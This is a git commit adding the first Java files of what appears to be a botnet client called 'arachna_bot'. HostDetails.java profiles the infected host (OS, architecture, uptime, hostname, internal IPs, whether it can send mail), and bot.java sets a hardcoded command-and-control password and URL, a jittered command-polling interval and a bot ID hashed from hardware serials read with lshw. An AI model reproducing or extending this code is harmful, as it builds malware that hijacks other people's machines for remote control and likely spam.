d8ff9e521dab0161e73e9c60f76fa1e7235c87a1
meandave <meandave@github.io>
2016-04-19 18:45:55 +0200

    first commit

---
+++ HostDetails.java
@@ -0,0 +1,75 @@
+
+package arachna.arachna_bot;
+
+import java.net.InetAddress;
+import java.net.UnknownHostException;
+/**
+ *
+ * sends host details
+ * 
+ */
+public class HostDetails {
+    /************************
+     * TARGET SYSTEM PARAMETERS
+     ************************/
+    // the name of the operating system
+    String osName;
+    // the system architecture
+    String osArch;
+    // version of the operating system
+    String osVersion;
+    // host uptime
+    String hostUpTime;
+    // name of the host
+    String hostName;
+    // IP of this host, defined in the interfaces
+    String hostIps;
+    
+    // SMPTP mode of operation
+    // the host can send mail directly:
+    //          mode "sef"
+    // the host needs it's own SMTP server to send mail:
+    //          mode "isp"
+    //the host cannot send any mail out
+    //          mode "filtered"
+    String smtpMode;
+    
+    public HostDetails(){
+        // clear the variables
+        osName = null;
+        osArch = null;
+        osVersion = null;
+        hostUpTime = null;
+        hostName = null;
+        hostIps = "";
+        
+        /*****************************
+         * GET THE DETAILS ABOUT HOST
+         *****************************/
+        osName = System.getProperty("os.name");
+        osArch = System.getProperty("os.arch");
+        osVersion = System.getProperty("os.version");
+        if (osName.toUpperCase().equals("LINUX")){
+            hostUpTime = Tools.runCmd("uptime");
+        }
+        InetAddress addrs[] = null;
+        
+        try {
+            hostName = InetAddress.getLocalHost().getHostName();
+        } catch(UnknownHostException e) {
+            e.printStackTrace();
+        }
+        
+        try {
+            addrs = InetAddress.getAllByName(hostName);
+        } catch(UnknownHostException e) {
+            e.printStackTrace();
+        }
+        
+        for (InetAddress addr : addrs){
+            if (! addr.isLoopbackAddress() && addr.isSiteLocalAddress()){
+                hostIps += addr.getHostAddress() + "||";
+            }
+        }
+    }
+}
---
+++ bot.java
@@ -0,0 +1,64 @@
+/*
+ * To change this license header, choose License Headers in Project Properties.
+ * To change this template file, choose Tools | Templates
+ * and open the template in the editor.
+ */
+package arachna.arachna_bot;
+import java.net.InetAddress;
+
+/**
+ *
+ * This class contains the key characteristics of the bot
+ * The bot ID
+ * The bot status
+ * Sleep cycle - how often will the bot check for commands
+ * 
+ */
+public class bot {
+    // INIT
+    
+    // status of the bot
+    String status;
+    // password auth to the server
+    String ccInitPwd;
+    // the init URL
+    String ccInitURL;
+    // check for command cycle in seconds
+    int checkCommandTime;
+    // random check for command cycle 
+    int checkCommandTimeRandom;
+    // unique ID
+    String botID;
+    // bot's public IP address
+    InetAddress publicIpAddr;
+    // network parameters concerning this bot
+    HostNetParams hostNetParams;
+    
+// CONSTRUCTOR
+    public bot() {
+        status = "Init";
+        ccInitPwd = "!@Aj&((^)*$iKSoS)_+kYbP";
+        ccInitURL = "http://192.168.16.103/";
+        checkCommandTime = 10;
+        checkCommandTimeRandom = 5;
+        botID = "";
+        publicIpAddr = null;
+        hostNetParams = new HostNetParams();
+    }
+    
+// BOT ID GENERATOR
+    /**
+     * Assigned a hash from the host hardware info
+     * Currently only implementable on Linux
+     */
+    public void generateBotID() {
+        HostDetails myHost = new HostDetails();
+        String hwInfo = "";
+        if (myHost.osName.toUpperCase().equals("LINUX")) {
+            hwInfo = Tools
+                    .runCmd("lshw | grep -e serial -e product |" +
+                    "grep -v Controller | grep -v None");
+        }
+        botID = Tools.computeMD5(hwInfo);
+    }
+}
